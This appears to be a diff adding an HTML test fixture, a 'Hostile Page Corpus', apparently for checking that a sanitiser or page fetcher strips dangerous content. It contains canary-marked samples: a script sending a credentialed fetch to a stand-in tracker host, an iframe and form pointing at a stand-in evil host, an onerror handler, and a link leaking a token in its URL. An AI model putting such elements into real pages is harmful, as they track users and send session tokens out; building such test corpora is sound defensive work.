@@ -1,0 +1,20 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Hostile Page Corpus</title>
+  </head>
+  <body>
+    <p>visible text CORPUS_OK</p>
+    <script>
+      document.cookie = 'sid=CORPUS_CANARY_SID';
+      fetch('https://tracker.example.com/corp', { credentials: 'include' });
+    </script>
+    <iframe src="https://evil-site.example.com/frame"></iframe>
+    <img src="https://tracker.example.com/pixel.png" onerror="CORPUS_CANARY_ONERROR" />
+    <form action="https://evil-site.example.com/submit">
+      <input name="token" value="CORPUS_CANARY_TOKEN" />
+    </form>
+    <a href="https://evil-site.example.com/leak?token=CORPUS_CANARY_QUERY">leak link</a>
+  </body>
+</html>
